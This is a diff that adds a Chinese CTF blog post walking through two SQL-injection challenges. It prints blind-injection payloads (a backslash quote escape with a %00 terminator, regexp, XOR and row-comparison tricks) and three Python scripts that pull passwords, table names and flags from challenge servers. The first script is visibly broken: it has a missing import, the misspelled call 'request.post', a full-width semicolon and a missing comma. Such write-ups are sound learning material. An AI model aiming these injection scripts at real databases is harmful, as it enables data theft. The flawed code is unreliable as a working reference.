@@ -1,0 +1,198 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>每周一题(四) | Wei's blog</title><meta name="author" content="Wei"><meta name="copyright" content="Wei"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="说好的一题呢？">
+<meta property="og:type" content="article">
+<meta property="og:title" content="每周一题(四)">
+<meta property="og:url" content="http://yiweibu.github.io/2024/06/02/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98(%E5%9B%9B)/index.html">
+<meta property="og:site_name" content="Wei&#39;s blog">
+<meta property="og:description" content="说好的一题呢？">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
+<meta property="article:published_time" content="2024-06-01T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-06-24T16:25:58.301Z">
+<meta property="article:author" content="Wei">
+<meta property="article:tag" content="ctf 每周一题">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://yiweibu.github.io/2024/06/02/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98(%E5%9B%9B)/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '每周一题(四)',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-06-25 00:25:58'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Wei's blog"><span class="site-name">Wei's blog</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">每周一题(四)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-06-01T16:00:00.000Z" title="发表于 2024-06-02 00:00:00">2024-06-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-06-24T16:25:58.301Z" title="更新于 2024-06-25 00:25:58">2024-06-25</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="每周一题(四)"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>说好的一题呢？</p>
+<span id="more"></span>
+
+<h2 id="NCTF2019-SQLi-GYCTF2020-Ezsqli"><a href="#NCTF2019-SQLi-GYCTF2020-Ezsqli" class="headerlink" title="[NCTF2019]SQLi&amp;&amp;[GYCTF2020]Ezsqli"></a>[NCTF2019]SQLi&amp;&amp;[GYCTF2020]Ezsqli</h2><h3 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p><img src="/imgs/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98(%E5%9B%9B)/image-20240602180918630.png" alt="image-20240602180918630"></p>
+<p>扫一下后台文件发现robots.txt，发现hint.txt</p>
+<p><img src="/imgs/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98(%E5%9B%9B)/image-20240602181501943.png" alt="image-20240602181501943"></p>
+<p>可以看到过滤了一堆关键字，用一般的方法注入肯定不行，但是好的地方是题目里已经把sql语句写了出来，我们可以根据黑名单和sql语句进行分析</p>
+<h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4><p>我们先来想一下怎么写一个poc，一般做法是用单引号闭合然后用注释符注释后面的部分，但是这里将单引号过滤了，考虑到有两个字段，可以用’\‘实现单引号逃逸，但是注释符好像都被过滤了，但是我灵光一现，突然就想到了%00截断（好吧，其实写的时候想不到怎么做直接看wp了呜呜</p>
+<p>尝试用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=\&amp;passwd=||1;%00</span><br></pre></td></tr></table></figure>
+
+<p>发现响应里有welcome.php</p>
+<p><img src="/imgs/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98(%E5%9B%9B)/image-20240602193345619.png" alt="image-20240602193345619"></p>
+<p>这个应该是正常的响应了，但是我们如何拿到flag呢？</p>
+<p>注意hint.txt里的一句话，If $_POST[‘passwd’] &#x3D;&#x3D;&#x3D; admin’s password即可得到flag，因此我们只需获得passwd字段的值就行，但是看这一大堆过滤，联合查询和报错查询应该都用不了了，那应该怎么做呢？</p>
+<p><strong>regexp正则注入</strong></p>
+<p>其实我们可以想到还可以用like类似模糊匹配来获取字段值，就可以想到regexp，它刚好也没有被黑名单过滤，但是这个模式串应该怎么写？因为passwd的每一个字符我们都不知道，但是我们知道了正常响应会给一个welcome.php，由此我们可以想到用盲注来获取信息，我们可以从第一个字符开始一步步猜测，比如’passwd regexp ^a’，不行就用’b’，直到有welcome.php出现在响应报文中，这个注入过程可以写一个脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">url = <span class="string">&#x27;http://0ee3cb75-d509-4e13-89ae-63671edde26a.node5.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#可能出现的字符，看到wp里这种简洁的写法就直接拿来用了</span></span><br><span class="line">string = string.ascii_lowercase + string.digits + <span class="string">&#x27;_&#x27;</span>  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):    <span class="comment">#猜测passwd值的长度，应该不至于超过50吧</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">		data = &#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;\\&#x27;</span></span><br><span class="line">				<span class="string">&#x27;passwd&#x27;</span>:<span class="string">&#x27;||passwd/**/regexp/**/&quot;^&#123;&#125;&quot;；&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(flag + j,parse.unquote(<span class="string">&#x27;%00&#x27;</span>))<span class="comment">#parse.unquote(&#x27;%00&#x27;)防止%00被转义</span></span><br><span class="line">		&#125; <span class="comment">#传&#x27;\&#x27;脚本里要写&#x27;\\&#x27;，否则把后面单引号转义了</span></span><br><span class="line">		r = request.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;welcome&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#注意如确定第一个字符为y时，只有正则式^yo会匹配到    </span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&#x27;_&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;welcome&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>最后得到密码</p>
+<p><img src="/imgs/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98(%E5%9B%9B)/image-20240602220219633.png" alt="image-20240602220219633"></p>
+<p>最后拿到flag</p>
+<p><img src="/imgs/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98(%E5%9B%9B)/image-20240602221008736.png" alt="image-20240602221008736"></p>
+<h3 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p><img src="/imgs/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98(%E5%9B%9B)/image-20240602221144847.png" alt="image-20240602221144847"></p>
+<p>用2-1,2试出来是数字型注入，但是union被过滤，并且报错只返回bool(false)，考虑盲注</p>
+<p>发现’|’，’^’未被过滤，可以用如’1^(ascii(substr((select(database())),1,1))&gt;1)^1’判断数据库名的第一个字符，以此类推。同样可以写个脚本(这里用以前的脚本稍微改了一下)</p>
+<p>爆表名，注意information_schema被过滤可用sys.schema_table_statistics_with_buffer替代</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment">#sess = requests.session() r = sess.get()</span></span><br><span class="line"><span class="comment">#sess.mount(&#x27;http://&#x27;, HTTPAdapter(max_retries=3))</span></span><br><span class="line"><span class="comment">#sess.mount(&#x27;https://&#x27;, HTTPAdapter(max_retries=3))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">url_format,length=<span class="literal">None</span></span>):</span><br><span class="line">    rlt = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    url  = url_format</span><br><span class="line">    <span class="keyword">if</span> length==<span class="literal">None</span>:</span><br><span class="line">        length = <span class="number">1000</span></span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,length+<span class="number">1</span>):</span><br><span class="line">        time.sleep(<span class="number">0.06</span>)</span><br><span class="line">    <span class="comment">#从可打印字符开始</span></span><br><span class="line">        begin = <span class="number">32</span></span><br><span class="line">        ends = <span class="number">128</span></span><br><span class="line">        tmp = (begin+ends)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> begin&lt;ends:</span><br><span class="line">            <span class="comment">#print(url.format(l,tmp))</span></span><br><span class="line">            <span class="comment">#r = requests.get(url.format(l,tmp))</span></span><br><span class="line">            <span class="comment">#sys.schema_table_statistics_with_buffer</span></span><br><span class="line">            postdata=&#123;</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>:<span class="string">&#x27;1^(ascii(substr((select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer)where(table_schema=database())),&#123;&#125;,1))&gt;&#123;&#125;)^1&#x27;</span>.<span class="built_in">format</span>(l,tmp)</span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url=url,data=postdata)</span><br><span class="line"></span><br><span class="line">            time.sleep(<span class="number">0.04</span>)</span><br><span class="line">            <span class="comment">#根据题目定</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Nu1L&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                begin = tmp+<span class="number">1</span></span><br><span class="line">                tmp = (begin+ends)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ends = tmp</span><br><span class="line">                tmp = (begin+ends)//<span class="number">2</span></span><br><span class="line">        <span class="comment">#酌情删除，毕竟一般库表列里都没有空格</span></span><br><span class="line">        <span class="keyword">if</span> tmp == <span class="number">32</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        rlt+=<span class="built_in">chr</span>(tmp)</span><br><span class="line">        <span class="built_in">print</span>(rlt)</span><br><span class="line">    <span class="comment">#return rlt.rstrip()</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://0c6136cd-28f3-4e59-88b0-23866525afa8.node5.buuoj.cn:81/&#x27;</span></span><br><span class="line">exp(url)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98(%E5%9B%9B)/image-20240602222543720.png" alt="image-20240602222543720"></p>
+<p>可是列名应该怎么办呢？同样我们可以用盲注的方法如select “{chr}” &gt; select * from f1ag_1s_h3r3_hhhh，如果f1ag_1s_h3r3_hhhh只有一列，当chr的ascii码值大于列名第一个字符ascii码值时，返回1，否则返回0</p>
+<p><strong>ps：f1ag_1s_h3r3_hhhh实际有两列，可以用select 1，2，select 1,2,3尝试，这里还需注意f1ag_1s_h3r3_hhhh必须只有一行记录</strong></p>
+<p><strong>例如存在记录：id&#x3D;1,flag&#x3D;c</strong></p>
+<p><strong>则select 1,d &gt; select 1,c</strong></p>
+<p><strong>返回1，其实就是”1d”&gt;”1c”</strong></p>
+<p>接着再写个脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://0c6136cd-28f3-4e59-88b0-23866525afa8.node5.buuoj.cn:81/&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">70</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        hexchar = flag + <span class="built_in">chr</span>(char)</span><br><span class="line">        <span class="comment">#刚开始一直比列名中字符的ascii值小，回显是V&amp;N，直到有个字符ascii码值大于它返回1，此时回显内容为Nu1L</span></span><br><span class="line">        payload = <span class="string">&#x27;2||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span>.<span class="built_in">format</span>(hexchar)</span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        data = &#123;<span class="string">&#x27;id&#x27;</span>:payload&#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        text = r.text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += <span class="built_in">chr</span>(char-<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>最后得到flag，将字符转小写即可</p>
+<p><img src="/imgs/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98(%E5%9B%9B)/image-20240602224755521.png" alt="image-20240602224755521"></p>
+<p><img src="/imgs/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98(%E5%9B%9B)/image-20240602224850990.png" alt="image-20240602224850990"></p>
+<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>sql注入还是有挺多需要注意的点的，刚好想到最近在写数据库课设，事真多啊啊啊</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://yiweibu.github.io">Wei</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://yiweibu.github.io/2024/06/02/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98(%E5%9B%9B)/">http://yiweibu.github.io/2024/06/02/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98(%E5%9B%9B)/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://yiweibu.github.io" target="_blank">Wei's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf-%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98/">ctf 每周一题</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/06/07/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98(%E4%BA%94)/" title="每周一题(五)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">每周一题(五)</div></div></a></div><div class="next-post pull-right"><a href="/2024/05/28/buu(%E4%BA%8C)/" title="buuctf一些刷过的题(二)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">buuctf一些刷过的题(二)</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/05/11/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98(%E4%B8%80)/" title="每周一题(一)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-11</div><div class="title">每周一题(一)</div></div></a></div><div><a href="/2024/05/17/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98(%E4%BA%8C)/" title="每周一题(二)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-17</div><div class="title">每周一题(二)</div></div></a></div><div><a href="/2024/05/26/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98(%E4%B8%89)/" title="每周一题(三)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-26</div><div class="title">每周一题(三)</div></div></a></div><div><a href="/2024/06/07/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98(%E4%BA%94)/" title="每周一题(五)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-07</div><div class="title">每周一题(五)</div></div></a></div><div><a href="/2024/06/18/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98(%E5%85%AD)/" title="每周一题(六)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-18</div><div class="title">每周一题(六)</div></div></a></div><div><a href="/2024/06/25/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98(%E4%B8%83)/" title="每周一题(七)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-25</div><div class="title">每周一题(七)</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Wei</div><div class="author-info__description">麻雀虽小，五脏俱全；菜鸟虽菜，越学越菜</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#NCTF2019-SQLi-GYCTF2020-Ezsqli"><span class="toc-number">1.</span> <span class="toc-text">[NCTF2019]SQLi&amp;&amp;[GYCTF2020]Ezsqli</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NCTF2019-SQLi"><span class="toc-number">1.1.</span> <span class="toc-text">[NCTF2019]SQLi</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-number">1.1.2.</span> <span class="toc-text">解题过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GYCTF2020-Ezsqli"><span class="toc-number">1.2.</span> <span class="toc-text">[GYCTF2020]Ezsqli</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">1.2.2.</span> <span class="toc-text">小结</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><div class="content"><a class="title" href="/2024/06/25/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98(%E4%B8%83)/" title="每周一题(七)">每周一题(七)</a><time datetime="2024-06-24T16:00:00.000Z" title="发表于 2024-06-25 00:00:00">2024-06-25</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2024/06/18/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98(%E5%85%AD)/" title="每周一题(六)">每周一题(六)</a><time datetime="2024-06-17T16:00:00.000Z" title="发表于 2024-06-18 00:00:00">2024-06-18</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2024/06/07/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98(%E4%BA%94)/" title="每周一题(五)">每周一题(五)</a><time datetime="2024-06-06T16:00:00.000Z" title="发表于 2024-06-07 00:00:00">2024-06-07</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2024/06/02/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98(%E5%9B%9B)/" title="每周一题(四)">每周一题(四)</a><time datetime="2024-06-01T16:00:00.000Z" title="发表于 2024-06-02 00:00:00">2024-06-02</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2024/05/28/buu(%E4%BA%8C)/" title="buuctf一些刷过的题(二)">buuctf一些刷过的题(二)</a><time datetime="2024-05-27T16:00:00.000Z" title="发表于 2024-05-28 00:00:00">2024-05-28</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Wei</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" 